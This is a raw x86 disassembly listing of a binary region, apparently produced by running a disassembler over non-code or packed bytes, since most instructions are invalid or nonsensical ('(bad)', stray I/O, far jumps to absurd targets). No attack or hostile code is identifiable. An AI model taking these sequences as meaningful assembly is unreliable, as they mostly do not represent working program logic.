  40c7db:	and    BYTE PTR [eax+eax*8],ah
  40c7de:	sbb    DWORD PTR [edx+0x47c205fc],ecx
  40c7e4:	out    0x7d,al
  40c7e6:	mov    ah,0x50
  40c7e8:	or     DWORD PTR [eax+eax*4],esp
  40c7eb:	push   edi
  40c7ec:	xchg   edi,eax
  40c7ed:	xor    DWORD PTR [ebp-0x3c],ebp
  40c7f0:	push   ebx
  40c7f1:	test   eax,0xa37a717d
  40c7f6:	das    
  40c7f7:	cwde   
  40c7f8:	frstor ds:0xd02af1b5
  40c7fe:	and    DWORD PTR [ecx],eax
  40c800:	mov    dl,BYTE PTR [esi-0x44]
  40c803:	(bad)  
  40c804:	fist   DWORD PTR [esi-0x8c11be7]
  40c80a:	xor    BYTE PTR [ecx-0x25a94fdc],bl
  40c810:	(bad)  
  40c811:	fcmovne st,st(0)
  40c813:	sbb    ebp,0x645b870d
  40c819:	jae    0x40c858
  40c81b:	ins    BYTE PTR es:[edi],dx
  40c81c:	ins    DWORD PTR es:[edi],dx
  40c81d:	lea    esi,[edi]
  40c81f:	jae    0x40c806
  40c821:	pop    edi
  40c822:	add    ch,BYTE PTR [ebp+0xb]
  40c825:	push   ecx
  40c826:	aam    0x89
  40c828:	test   DWORD PTR [edx],edi
  40c82a:	sbb    ecx,eax
  40c82c:	movsx  eax,di
  40c82f:	add    eax,DWORD PTR [ebp+0x3dfe34c4]
  40c835:	dec    ebx
  40c836:	in     eax,0xaf
  40c838:	push   ecx
  40c839:	ss call 0xba94:0x16e70501
  40c841:	dec    ebp
  40c842:	xor    DWORD PTR [ecx+0x41],0xffffffc5
  40c846:	or     al,0x16
  40c848:	jp     0x40c843
  40c84a:	hlt    
  40c84b:	data16 sub al,0xea
  40c84e:	jp     0x40c80b
  40c850:	aas    
  40c851:	daa    
  40c852:	(bad)  
  40c853:	arpl   WORD PTR [ecx-0x60],di
  40c856:	push   ecx
  40c857:	jle    0x40c89a
  40c859:	lock push es
  40c85b:	xchg   esp,eax
  40c85c:	ins    DWORD PTR es:[edi],dx
  40c85d:	adc    eax,0xee8f4bf8
  40c862:	pop    esp
  40c863:	aas    
  40c864:	dec    ebx
  40c865:	sub    BYTE PTR [edi+0x50],0x3c
  40c869:	inc    edi
  40c86a:	mov    WORD PTR [ecx+0x4d14ef6],cs
  40c870:	cmp    al,0x50
  40c872:	cs shr ebp,cl
  40c875:	xor    DWORD PTR [esp+eiz*2+0x78022de],edi
  40c87c:	fimul  DWORD PTR [esi+0x18]
  40c880:	or     BYTE PTR [ebx-0x9],bl
  40c883:	jmp    0x40c8ee
  40c885:	jg     0x40c82a
  40c887:	test   al,0xd5
  40c889:	ins    BYTE PTR es:[edi],dx
  40c88a:	pop    di
  40c88c:	(bad)  [ebx+0x45030c45]
  40c892:	or     BYTE PTR [ecx+0x458bf045],cl
  40c898:	in     al,0x85
  40c89a:	ror    BYTE PTR [edi],0x84
  40c89d:	jbe    0x40c8ad
  40c89f:	add    BYTE PTR [eax],al
  40c8a1:	mov    DWORD PTR [ebp-0x24],esi
  40c8a4:	push   0xb
  40c8a6:	pop    ecx
  40c8a7:	push   0x5
  40c8a9:	jmp    0x40ca07
  40c8ae:	stos   DWORD PTR es:[edi],eax
  40c8af:	xchg   DWORD PTR [eax-0x42c643da],ecx
  40c8b5:	fwait
  40c8b6:	adc    bh,bl
  40c8b8:	hlt    
  40c8b9:	call   0xf3f7:0xc3fbdc7e
  40c8c0:	jle    0x40c940
  40c8c2:	aas    
  40c8c3:	jg     0x40c943
  40c8c5:	jle    0x40c916
  40c8c7:	add    ch,BYTE PTR ds:0xa0c73f42
  40c8cd:	jns    0x40c855
  40c8cf:	cmc    
  40c8d0:	mov    ecx,0xc7823718
  40c8d5:	shl    dh,1
  40c8d7:	mov    bl,0xec
  40c8d9:	stc    
  40c8da:	hlt    
  40c8db:	aas    
  40c8dc:	inc    edx
  40c8dd:	(bad)  [edi]
  40c8df:	js     0x40c931
  40c8e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8e2:	push   ebx
  40c8e3:	push   es
  40c8e4:	sbb    DWORD PTR [esi-0x52],edx
  40c8e7:	cld    
  40c8e8:	push   ds
  40c8e9:	adc    al,0xa1
  40c8eb:	jg     0x40c923
  40c8ed:	inc    ebp
  40c8ee:	ret    
  40c8ef:	call   0xd99:0x72b8e0bb
  40c8f6:	ds dec sp
  40c8f9:	push   es
  40c8fa:	inc    ebx
  40c8fb:	xor    DWORD PTR [eax+ebx*2-0x12],0xb3294bcd
  40c903:	pop    ebp
  40c904:	enter  0x716c,0x29
  40c908:	lds    ebp,FWORD PTR [ecx-0x19e96769]
  40c90e:	lods   al,BYTE PTR ds:[esi]
  40c90f:	pop    ebp
  40c910:	mov    ebx,0xfb1f614a
  40c915:	add    bl,ah
  40c917:	xchg   edx,eax
  40c918:	mov    al,ds:0x600bc1ad
  40c91d:	add    ecx,0x14
  40c920:	dec    edi
  40c921:	add    BYTE PTR [eax],0xc9
  40c924:	je     0x40c8a6
  40c926:	push   ebp
  40c927:	mov    dh,0x21
  40c929:	pushf  
  40c92a:	leave  
  40c92b:	adc    esp,eax
  40c92d:	fsub   QWORD PTR [esi]
  40c92f:	and    ebx,ebp
  40c931:	pop    es
  40c932:	imul   ebp,esi,0xd2ff3da2
  40c938:	push   edi
  40c939:	cmp    al,0x94
  40c93b:	loopne 0x40c96e
  40c93d:	mov    ah,BYTE PTR [eax]
  40c93f:	jmp    0x2072c7a2
  40c944:	mov    bl,0x59
  40c946:	rol    BYTE PTR [ecx+0x4f],0xed
  40c94a:	adc    eax,0xaf16b40e
  40c94f:	jns    0x40c992
  40c951:	ins    BYTE PTR es:[edi],dx
  40c952:	test   al,0x37
  40c954:	retf   
  40c955:	int3   
  40c956:	pusha  
  40c957:	test   DWORD PTR [edi-0x6dca81ad],ecx
  40c95d:	mov    BYTE PTR [ebp-0x5e],bh
  40c960:	(bad)  
  40c962:	sbb    esi,DWORD PTR [ebx-0x67c2d1e1]
  40c968:	ficom  DWORD PTR [eax+0x2af8ff49]
  40c96e:	push   esp
  40c96f:	mov    al,0x25
  40c971:	icebp  
  40c972:	shl    BYTE PTR [ebx+0x5a],cl
  40c975:	mov    dl,0x17
  40c977:	xchg   edi,eax
  40c978:	scas   al,BYTE PTR es:[edi]
  40c979:	xchg   edx,eax
  40c97a:	adc    bl,BYTE PTR [ecx+0x5c]
  40c97d:	mov    bh,0xe2
  40c97f:	(bad)  [esi-0x175e8e28]
  40c985:	sahf   
  40c986:	pop    edi
  40c987:	popa   
  40c988:	(bad)  [ecx]
  40c98a:	dec    esp
  40c98b:	test   eax,0x95ab8936
  40c990:	and    esi,edx
  40c992:	jne    0x40c95e
  40c994:	pop    edx
  40c995:	dec    ebp
  40c996:	dec    edx
  40c997:	sub    DWORD PTR [edi-0x2208fa4c],0x64a3d9a1
  40c9a1:	fsubr  DWORD PTR [edx+0x2f]
  40c9a4:	fs mov cl,0x2c
  40c9a7:	cmp    dh,BYTE PTR ds:0xd9c20de6
  40c9ad:	mov    al,ds:0x73801e3
  40c9b2:	push   esi
  40c9b3:	xchg   DWORD PTR [esi-0x3a],esi
  40c9b6:	xchg   DWORD PTR [eax],edi
  40c9b8:	pop    esi
  40c9b9:	and    BYTE PTR [esi+0x5f],cl
  40c9bc:	jge    0x40ca3a
  40c9be:	mov    ebp,0x9aa58aac
  40c9c3:	inc    edi
  40c9c4:	xor    edi,DWORD PTR [esi-0x80]
  40c9c7:	dec    edx
  40c9c8:	lods   al,BYTE PTR ds:[esi]
  40c9c9:	mov    bh,bh
  40c9cb:	xchg   esp,eax
  40c9cc:	scas   al,BYTE PTR es:[edi]
  40c9cd:	btr    DWORD PTR [ecx+esi*4-0xcf7d19d],ebp
  40c9d5:	adc    BYTE PTR [edx-0x3387f3a7],ah
  40c9db:	(bad)
  40c9df:	lock aad 0x9f
  40c9e2:	js     0x40c9c1
  40c9e4:	xor    bh,BYTE PTR [ecx+0x71dae3d4]
  40c9ea:	fisubr WORD PTR [edi-0x6b]
  40c9ed:	jb     0x40c995
  40c9ef:	mov    esi,fs
  40c9f1:	jne    0x40ca32
  40c9f3:	push   0xffffffd2
  40c9f5:	cmp    DWORD PTR [ebp+0x7],0x12
  40c9f9:	mov    dl,0x21
  40c9fb:	sti    
  40c9fc:	adc    eax,0xbf735ad4
  40ca01:	jmp    0x49aa:0xb9d36e4d
  40ca08:	jmp    0x40cb66
  40ca0d:	and    DWORD PTR [esi+eax*2+0x65fd5b1b],edx
  40ca14:	lods   al,BYTE PTR ds:[esi]
  40ca15:	retf   
  40ca16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca17:	sub    eax,0x830961cf
  40ca1c:	ret    
  40ca1d:	dec    eax
  40ca1e:	hlt    
  40ca1f:	jle    0x40ca9f
  40ca21:	aas    
  40ca22:	jg     0x40caa2
  40ca24:	jle    0x40c9d3
  40ca26:	mov    al,0x3
  40ca28:	jnp    0x40ca15
  40ca2a:	inc    ebp
  40ca2b:	mov    dh,0x19
  40ca2d:	repz popa 
  40ca2f:	cmp    al,0x30
  40ca31:	test   BYTE PTR [ecx],0x87
  40ca34:	xchg   DWORD PTR [esi],ebx
  40ca36:	mov    bh,BYTE PTR [ebx]
  40ca38:	and    DWORD PTR [edx],eax
  40ca3a:	std    
  40ca3b:	not    BYTE PTR [ebx-0x19256707]
  40ca41:	adc    DWORD PTR ds:0x377e1cfd,edi
  40ca47:	icebp  
  40ca48:	jb     0x40cabc
  40ca4a:	mov    ds:0xe0ed3d10,eax
  40ca4f:	xor    ecx,DWORD PTR [eax+eiz*2+0x15b98fbc]
  40ca56:	sub    BYTE PTR [eax*8+0x5950be05],ah
  40ca5d:	pop    esi
  40ca5e:	mov    esi,0xbb561386
  40ca63:	ins    DWORD PTR es:[edi],dx
  40ca64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca65:	mov    ds:0x77f23d11,al
  40ca6a:	cld    
  40ca6b:	cmp    esp,DWORD PTR [eax+0x64]
  40ca6e:	inc    esp
  40ca6f:	push   esi
  40ca70:	sbb    BYTE PTR [eax],cl
  40ca72:	sub    DWORD PTR [edx],ebx
  40ca74:	shl    BYTE PTR [ecx+0x7c],1
  40ca77:	push   ss
  40ca78:	inc    esi
  40ca79:	rcl    BYTE PTR [ebx+0x62369913],1
  40ca7f:	lock inc esp
  40ca81:	push   eax
  40ca82:	dec    eax
  40ca83:	push   ebp
  40ca84:	jg     0x40cae0
  40ca86:	or     ecx,esp
  40ca88:	push   ebp
  40ca89:	lea    eax,[ebx]
  40ca8b:	sbb    DWORD PTR [edx-0x43],esi
  40ca8e:	ins    DWORD PTR es:[edi],dx
  40ca8f:	xchg   esp,eax
  40ca90:	cmp    ch,BYTE PTR [eax]
  40ca92:	stc    
  40ca93:	xchg   eax,esp
  40ca95:	mov    esp,0x1d4cb465
  40ca9a:	loopne 0x40ca2a
  40ca9c:	jp     0x40ca26
  40ca9e:	sbb    BYTE PTR [ecx+edi*4+0x5933ae39],bl
  40caa5:	cmc    
  40caa6:	sahf   
  40caa7:	dec    ecx
  40caa8:	push   ebx
  40caa9:	mov    dl,BYTE PTR [edi]
  40caab:	xor    BYTE PTR [edx],ah
  40caad:	push   es
  40caae:	or     ah,BYTE PTR [eax+0x1b]
  40cab1:	add    al,0x7e
  40cab3:	add    dl,BYTE PTR [edi+0x75edb5f1]
  40cab9:	rcl    BYTE PTR [edx+ebp*1],0x9e
  40cabd:	mov    BYTE PTR [esi-0x5f8a05f0],al
  40cac3:	bound  edi,QWORD PTR [esi]
  40cac5:	enter  0xa182,0xf0
  40cac9:	imul   esi,DWORD PTR [edi],0x3f
  40cacc:	fs mov edx,0x60dd0c0e
  40cad2:	inc    ebx
  40cad3:	push   eax
  40cad4:	ins    DWORD PTR es:[edi],dx
  40cad5:	and    BYTE PTR [ebx],bh
  40cad7:	mov    ebx,0xe6674021
  40cadc:	push   0x8f6a9c45
  40cae1:	icebp  
  40cae2:	mov    WORD PTR [esi*1+0x39be0129],fs
  40cae9:	arpl   WORD PTR ds:0xe7133f77,si
  40caef:	mov    dl,0x9b
  40caf1:	lods   eax,DWORD PTR ds:[esi]
  40caf2:	fsubrp st(3),st
  40caf4:	or     eax,0x1267659e
  40caf9:	adc    DWORD PTR [ebp+0x69],ecx
  40cafc:	pop    ecx
  40cafd:	or     ch,BYTE PTR [eax+0x8]
  40cb00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb01:	cli    
  40cb02:	out    dx,al
  40cb03:	in     eax,dx
  40cb04:	out    dx,eax
  40cb05:	clc    
  40cb06:	ret    
  40cb07:	xchg   esp,eax
  40cb08:	jmp    0xefef:0x80742161
  40cb0f:	adc    BYTE PTR [edi-0x14],cl
  40cb12:	scas   eax,DWORD PTR es:[edi]
  40cb13:	mov    edi,0x33d02381
  40cb18:	mov    dh,0x75
  40cb1a:	xchg   ebx,eax
  40cb1b:	or     eax,0x22140a20
  40cb20:	(bad)  
  40cb21:	jmp    0x40cae6
  40cb23:	(bad)  
  40cb24:	(bad)  
  40cb26:	mov    bh,BYTE PTR [esi+0x14e88e08]
  40cb2c:	inc    esp
  40cb2d:	and    al,0xe9
  40cb2f:	fistp  DWORD PTR [edi-0x51]
  40cb32:	cmp    ah,BYTE PTR [esi+eiz*8-0x69bce9a1]
  40cb39:	push   es
  40cb3a:	call   0xe9c75cc9
  40cb3f:	sar    DWORD PTR [ebx+0x2a],cl
  40cb42:	in     al,0x79
  40cb44:	push   ebx
  40cb45:	mov    BYTE PTR [edi+edx*1+0x6e],cl
  40cb49:	fisttp DWORD PTR [ecx-0x3e]
  40cb4c:	pop    es
  40cb4d:	xchg   esi,eax
  40cb4e:	adc    eax,0x5b7f7c5f
  40cb53:	push   eax
  40cb54:	cld    
  40cb55:	les    ebp,FWORD PTR [esi]
  40cb57:	push   ecx
  40cb58:	mov    esp,0xd3280f55
  40cb5d:	lea    esp,[edi+0x66]
  40cb60:	and    eax,0x6fc95eb6
  40cb65:	and    ebx,DWORD PTR [ebx-0x79]
  40cb68:	retf   
  40cb69:	sub    ebx,ecx
  40cb6b:	xchg   ebx,ecx
  40cb6d:	dec    ecx
  40cb6e:	mov    eax,DWORD PTR [ebp-0x1c]
  40cb71:	imul   eax,ecx
  40cb74:	sub    esp,eax
  40cb76:	mov    DWORD PTR [ebp-0x24],esp
  40cb79:	jmp    0x40ccd7
  40cb7e:	jp     0x40cb94
  40cb80:	rcr    eax,0x59
  40cb83:	std    
  40cb84:	jnp    0x40cb1a
  40cb86:	mov    BYTE PTR [ebp-0x29],ch
  40cb89:	jl     0x40cb6f
  40cb8b:	icebp  
  40cb8c:	push   ebp
  40cb8d:	sub    eax,0x7e7ef609
  40cb92:	aas    
  40cb93:	jg     0x40cc13
  40cb95:	jle    0x40cbea
  40cb97:	inc    esp
  40cb98:	das    
  40cb99:	fdiv   DWORD PTR [ebx+ebx*2+0x64]
  40cb9d:	xchg   esi,eax
  40cb9e:	and    edi,DWORD PTR [edx+ebp*1+0x68c554d8]
  40cba5:	enter  0xe60a,0x89
  40cba9:	test   ah,cl
  40cbab:	fwait
  40cbac:	cmp    al,0xbb
  40cbae:	mov    esi,0x16b3ebd0
  40cbb3:	inc    eax
  40cbb4:	or     esi,DWORD PTR [edi+0x7a2bb5cd]
  40cbba:	in     al,0xdd
  40cbbc:	jo     0x40cb76
  40cbbe:	loop   0x40cc1e
  40cbc0:	adc    DWORD PTR [ebx-0x77],ecx
  40cbc3:	adc    DWORD PTR [eax-0x33],edx
  40cbc6:	(bad)  
  40cbc8:	int    0x9c
  40cbca:	mov    ah,bl
  40cbcc:	inc    esp
  40cbcd:	and    al,0xb
  40cbcf:	hlt    
  40cbd0:	pop    ecx
  40cbd1:	jge    0x40cbc3
  40cbd3:	inc    BYTE PTR [ebp+0x274b47f3]
  40cbd9:	ficom  WORD PTR [ecx-0x16]
  40cbdc:	adc    BYTE PTR [eax-0x13],0xe7
  40cbe0:	pop    ss
  40cbe1:	push   edi
  40cbe2:	and    eax,0x16da7a49
  40cbe7:	stos   DWORD PTR es:[edi],eax
  40cbe8:	push   es
  40cbe9:	cmp    ecx,ebp
  40cbeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbec:	jmp    0xec08bd2
  40cbf1:	mov    al,0x4
  40cbf3:	inc    edx
  40cbf4:	fcom   QWORD PTR [esi]
  40cbf6:	mov    ds:0xdadfac35,eax
  40cbfb:	xor    BYTE PTR [edi-0xbf13482],dh
  40cc01:	jnp    0x40cc60
  40cc03:	ins    BYTE PTR es:[edi],dx
  40cc04:	push   eax
  40cc05:	jo     0x40cc80
  40cc07:	sbb    DWORD PTR [ecx],esi
  40cc09:	pop    edx
  40cc0a:	cmp    eax,0xda874299
  40cc0f:	xor    eax,0xfa172039
  40cc14:	sti    
  40cc15:	aaa    
  40cc16:	adc    al,0xac
  40cc18:	mov    al,0x9f
  40cc1a:	enter  0x1489,0x4e
  40cc1e:	(bad)  
  40cc1f:	push   ds
  40cc20:	inc    eax
  40cc21:	fnstsw WORD PTR [ebp+0x50]
  40cc24:	xchg   eax,ebp
  40cc26:	and    eax,0xa508970d
  40cc2b:	jns    0x40cbcd
  40cc2d:	cld    
  40cc2e:	mov    ah,0xf4
  40cc30:	scas   al,BYTE PTR es:[edi]
  40cc31:	ret    0xfb66
  40cc34:	push   ecx
  40cc35:	je     0x40cc92
  40cc37:	xor    esp,DWORD PTR [ecx]
  40cc39:	jmp    0x1642:0x347cc391
  40cc40:	cmp    DWORD PTR [ecx-0x65c5514e],0x14a4655
  40cc4a:	and    DWORD PTR [edi],esp
  40cc4c:	sub    ch,BYTE PTR [eax-0x46]
  40cc4f:	xor    al,0x1f
  40cc51:	mov    edx,0xc0e53faf
  40cc56:	and    BYTE PTR [esi-0x36d91a07],bh
  40cc5c:	cli    
  40cc5d:	add    al,0x5b
  40cc5f:	aam    0x52
  40cc61:	push   0x67f39868
  40cc66:	cwde   
  40cc67:	push   cs
  40cc68:	ror    DWORD PTR [ebx],1
  40cc6a:	pop    esi
  40cc6b:	mov    ecx,0x5d298a55
  40cc70:	test   ecx,esi
  40cc72:	xor    DWORD PTR [esi+ecx*8-0x7a],esi
  40cc76:	fldcw  WORD PTR [eax+eiz*8-0x33]
  40cc7a:	adc    bl,BYTE PTR [ebx]
  40cc7c:	(bad)
  40cc7f:	sbb    DWORD PTR [edi],eax
  40cc81:	push   ebx
  40cc82:	call   0x733b5708
  40cc87:	(bad)  
  40cc88:	shr    DWORD PTR [ebp+ebx*1+0x72],1
  40cc8c:	aaa    
  40cc8d:	js     0x40cd01
  40cc8f:	mov    al,ds:0x945ad4b1
  40cc94:	mov    al,0x25
  40cc96:	mov    al,0x67
  40cc98:	hlt    
  40cc99:	outs   dx,BYTE PTR ds:[esi]
  40cc9a:	push   edi
  40cc9b:	or     cl,ch
  40cc9d:	push   ds
  40cc9e:	in     eax,dx
  40cc9f:	cwde   
  40cca0:	mov    WORD PTR [eax-0x45],?
  40cca3:	lahf   
  40cca4:	mov    eax,ds:0xccc80fb1
  40cca9:	or     al,0x13
  40ccab:	xadd   BYTE PTR [esi],bl
  40ccae:	or     eax,0x51f9c7fd
  40ccb3:	pop    esp
  40ccb4:	fidiv  WORD PTR [esi+0x25676186]
  40ccba:	test   al,0xde
  40ccbc:	sbb    ch,cl
  40ccbe:	int    0xd7
  40ccc0:	mov    al,0x90
  40ccc2:	out    0x7f,eax
  40ccc4:	lods   al,BYTE PTR ds:[esi]
  40ccc5:	enter  0xdaa7,0xda
  40ccc9:	retf   0x605b
  40cccc:	sar    BYTE PTR [eax+0x2caa4db],cl
  40ccd2:	cmp    ch,BYTE PTR [ecx-0x80]
  40ccd5:	adc    DWORD PTR [ebp-0x75],ecx
  40ccd8:	inc    ebp
  40ccd9:	cld    
  40ccda:	mov    ecx,0x7510856
  40ccdf:	jmp    0x40ce3d
  40cce4:	test   DWORD PTR [ebx+0x4e],esi
  40cce7:	test   al,0x40
  40cce9:	jge    0x40cd68
  40cceb:	cmp    edi,DWORD PTR ds:0x68ec1d3a
  40ccf1:	and    ecx,esi
  40ccf3:	(bad)  
  40ccf4:	retf   0x7ef7
  40ccf7:	jle    0x40cd38
  40ccf9:	jg     0x40cd79
  40ccfb:	jle    0x40cd16
  40ccfd:	out    0xa,al
  40ccff:	mov    eax,ds:0x4147c514
  40cd04:	shr    DWORD PTR [eax],0x96
  40cd07:	xor    BYTE PTR [ebx-0x3d],0x70
  40cd0b:	ins    DWORD PTR es:[edi],dx
  40cd0c:	rcr    ch,1
  40cd0e:	jmp    0xc02be010
  40cd13:	mov    esp,0x39475b91
  40cd18:	stos   BYTE PTR es:[edi],al
  40cd19:	sbb    ebp,DWORD PTR [ebp-0x6]
  40cd1c:	pop    edi
  40cd1d:	xor    BYTE PTR [esi-0x475032a3],bl
  40cd23:	das    
  40cd24:	or     ch,BYTE PTR [ebx+0x5fecbbca]
  40cd2a:	ds ss xchg ebx,eax
  40cd2d:	mov    ecx,0x476b230e
  40cd32:	xor    esi,ebx
  40cd34:	adc    dh,BYTE PTR [ebp+0x1416a32b]
  40cd3a:	retf   
  40cd3b:	sub    BYTE PTR [ebx],ah
  40cd3d:	xchg   ebx,eax
  40cd3e:	div    DWORD PTR [edx+eax*8]
  40cd41:	(bad)  
  40cd42:	not    BYTE PTR [eax+0x7d]
  40cd45:	xlat   BYTE PTR ds:[ebx]
  40cd46:	cli    
  40cd47:	daa    
  40cd48:	inc    ecx
  40cd49:	jne    0x40ccf8
  40cd4b:	mov    ch,0xb3
  40cd4d:	sbb    eax,0xe7180dbe
  40cd52:	pop    ebx
  40cd53:	xor    dh,BYTE PTR gs:[edi-0x12]
  40cd57:	mov    ebp,0xd90f3237
  40cd5c:	cmp    eax,0x6d3c8216
  40cd61:	enter  0x61a6,0x58
  40cd65:	push   cs
  40cd66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd68:	push   ecx
  40cd69:	jmp    0x40cdab
  40cd6b:	pushf  
  40cd6c:	or     eax,0x49f17c82
  40cd71:	and    ebp,DWORD PTR [ebp-0x66029b31]
  40cd77:	int    0x5b
  40cd79:	sahf   
  40cd7a:	cld    
  40cd7b:	(bad)  
  40cd7c:	sbb    bh,dh
  40cd7e:	imul   esp,DWORD PTR [edx+ebx*2+0x53],0x89952209
  40cd86:	fisub  DWORD PTR [edi+ebx*1+0x4]
  40cd8a:	je     0x40cd1b
  40cd8c:	xchg   esi,eax
  40cd8d:	pmulhw mm4,QWORD PTR [edi+0xdef88a9]
  40cd94:	sub    ah,BYTE PTR [ebp+0x289fd494]
  40cd9a:	gs jg  0x40cdd8
  40cd9d:	jle    0x40cd31
  40cd9f:	jl     0x40cdba
  40cda1:	dec    ebx
  40cda2:	push   0xd652926a
  40cda7:	(bad)  
  40cda8:	xchg   ebx,eax
  40cda9:	push   cs
  40cdaa:	outs   dx,BYTE PTR ds:[esi]
  40cdab:	mov    BYTE PTR [esi+0x4cfb82c2],cl
  40cdb1:	xchg   BYTE PTR [eax+0x60],dl
  40cdb4:	or     DWORD PTR [ebx+0xd],0x47
  40cdb8:	mov    esp,0x71c59a52
  40cdbd:	inc    edx
  40cdbe:	scas   al,BYTE PTR es:[edi]
  40cdbf:	jge    0x40cdb6
  40cdc1:	fild   DWORD PTR [ebx+0x1a]
  40cdc4:	mul    BYTE PTR [ebx+0x2bd182fe]
  40cdca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdcb:	or     edi,DWORD PTR [edx-0x1e]
  40cdce:	mov    eax,0x3183b6a4
  40cdd3:	and    ecx,ebp
  40cdd5:	div    BYTE PTR [edi+0x3b39375a]
  40cddb:	neg    DWORD PTR [ecx+0x79]
  40cdde:	xor    ch,BYTE PTR [edi]
  40cde0:	or     eax,0xd3acba4b
  40cde5:	adc    BYTE PTR [eax+0x3857aa78],0x51
  40cdec:	cdq    
  40cded:	mov    eax,0xabf7639
  40cdf2:	jge    0x40cda7
  40cdf4:	mov    cl,0xbc
  40cdf6:	pop    esi
  40cdf7:	retf   0xfaca
  40cdfa:	stc    
  40cdfb:	in     eax,0xe9
  40cdfd:	ins    DWORD PTR es:[edi],dx
  40cdfe:	mov    ds:0x973b9e8e,eax
  40ce03:	aaa    
  40ce04:	pop    ebp
  40ce05:	xor    DWORD PTR [eax],esi
  40ce07:	cdq    
  40ce08:	or     DWORD PTR [edx+ecx*2-0x2],0xffffffe0
  40ce0d:	(bad)  
  40ce0e:	fimul  WORD PTR [ebp-0x1b]
  40ce11:	xor    eax,0x5a128da7
  40ce16:	scas   eax,DWORD PTR es:[edi]
  40ce17:	iret   
  40ce18:	mov    ds:0xcc40d477,al
  40ce1d:	mov    dh,0x1a
  40ce1f:	mov    dh,0xe7
  40ce21:	push   edi
  40ce22:	dec    esi
  40ce23:	(bad)  
  40ce24:	fwait
  40ce25:	test   DWORD PTR [ecx+ebx*1-0x51a9abda],0x9401fd73
  40ce30:	stos   BYTE PTR es:[edi],al
  40ce31:	add    eax,0x430ef5f4
  40ce36:	add    BYTE PTR [ecx-0x33],0xc7
  40ce3a:	sub    edi,DWORD PTR [edi+esi*2]
  40ce3d:	xor    eax,ecx
  40ce3f:	mov    edx,0x32729d
  40ce44:	add    eax,edx
  40ce46:	jmp    0x40cfa4
  40ce4b:	mov    dl,0xd7
  40ce4d:	or     al,0x5b
  40ce4f:	lods   eax,DWORD PTR ds:[esi]
  40ce50:	jge    0x40ce97
  40ce52:	out    0xb5,eax
  40ce54:	mov    ds:0xa17f5331,eax
  40ce59:	mov    ds:0x7e888b4e,eax
  40ce5e:	jle    0x40ce9f
  40ce60:	jg     0x40cee0
  40ce62:	jle    0x40ce66
  40ce64:	push   ebx
  40ce65:	shl    ebp,cl
  40ce67:	cs dec eax
  40ce69:	push   edi
  40ce6a:	dec    edi
  40ce6b:	int    0x8d
  40ce6d:	fadd   st,st(3)
  40ce6f:	push   0x60
  40ce71:	dec    BYTE PTR [ecx-0x2faf2c6c]
  40ce77:	(bad)  
  40ce78:	lock mov ebp,0x5af5483e
  40ce7e:	pushf  
  40ce7f:	jle    0x40ce3c
  40ce81:	into   
  40ce82:	or     dh,al
  40ce84:	leave  
  40ce85:	inc    esp
  40ce86:	cwde   
  40ce87:	arpl   WORD PTR [esi-0xf],bp
  40ce8a:	pop    esp
  40ce8b:	sub    ch,BYTE PTR [ebx+0x55a4fc35]
  40ce91:	jo     0x40ceee
  40ce93:	out    0xc,eax
  40ce95:	push   eax
  40ce96:	push   cs
  40ce97:	cmp    BYTE PTR [edi-0x4b],0x15
  40ce9b:	repnz arpl WORD PTR [ebp-0x1f427b34],di
  40cea2:	push   eax
  40cea3:	mov    ch,BYTE PTR [edx-0x74]
  40cea6:	imul   esi,DWORD PTR [esi],0xb02fc3cf
  40ceac:	xor    edx,ebx
  40ceae:	sub    ebp,esp
  40ceb0:	push   esi
  40ceb1:	cdq    
  40ceb2:	dec    edi
  40ceb3:	mul    BYTE PTR [ebp-0x570d45ea]
  40ceb9:	fistp  WORD PTR ds:0xc98843fa
  40cebf:	xor    eax,0x835821ed
  40cec4:	dec    ecx
  40cec5:	pop    ebp
  40cec6:	mov    DWORD PTR [ecx],esp
  40cec8:	aam    0xdd
  40ceca:	push   es
  40cecb:	shl    DWORD PTR [ebp+0x67],1
  40cece:	sbb    al,0x60
  40ced0:	daa    
  40ced1:	popf   
  40ced2:	dec    esp
  40ced3:	fistp  DWORD PTR [esi+edx*4]
  40ced6:	arpl   WORD PTR [ecx+ebp*1+0x63],di
  40ceda:	jmp    0x15e4212c
  40cedf:	les    esp,FWORD PTR [eax]
  40cee1:	std    
  40cee2:	inc    ebx
  40cee3:	pop    ebx
  40cee4:	or     edi,DWORD PTR [eax+ebx*1-0x46]
  40cee8:	hlt    
  40cee9:	jae    0x40ceb7
  40ceeb:	jne    0x40cf18
  40ceed:	sub    BYTE PTR [ecx+0x22],bh
  40cef0:	jae    0x40cee9
  40cef2:	sbb    bh,cl
  40cef4:	scas   al,BYTE PTR es:[edi]
  40cef5:	cmp    bh,cl
  40cef7:	pop    eax
  40cef8:	clc    
  40cef9:	aam    0x61
  40cefb:	jno    0x40ce7d
  40cefd:	and    BYTE PTR [eax],dl
  40ceff:	out    0x5c,eax
  40cf01:	and    eax,0xa3bccbc3
  40cf06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf07:	fild   WORD PTR [ecx+0x6ab8fb5b]
  40cf0d:	jmp    0xf376c818
  40cf12:	retf   
  40cf13:	data16 in al,0xfa
  40cf16:	inc    edx
  40cf17:	jle    0x40cf79
  40cf19:	push   cs
  40cf1a:	movd   mm3,DWORD PTR [ecx+eiz*1]
  40cf1e:	outs   dx,BYTE PTR ds:[esi]
  40cf1f:	sub    DWORD PTR [edi+edi*2],ebx
  40cf22:	mov    es,WORD PTR [esi]
  40cf24:	mov    bh,0xc5
  40cf26:	scas   al,BYTE PTR es:[edi]
  40cf27:	mul    esp
  40cf29:	pushf  
  40cf2a:	cmp    ecx,0xffffff8e
  40cf2d:	les    esi,FWORD PTR [edi-0x642f41c9]
  40cf33:	inc    esp
  40cf34:	jp     0x40cf51
  40cf36:	sbb    esp,DWORD PTR [edi-0x12]
  40cf39:	add    al,0xd0
  40cf3b:	repz inc edi
  40cf3d:	mul    BYTE PTR cs:[ebx-0x1f]
  40cf41:	ret    
  40cf42:	les    eax,FWORD PTR [ebx]
  40cf44:	adc    eax,0x9a4b2977
  40cf49:	sub    ebp,edi
  40cf4b:	std    
  40cf4c:	mov    ch,0xa4
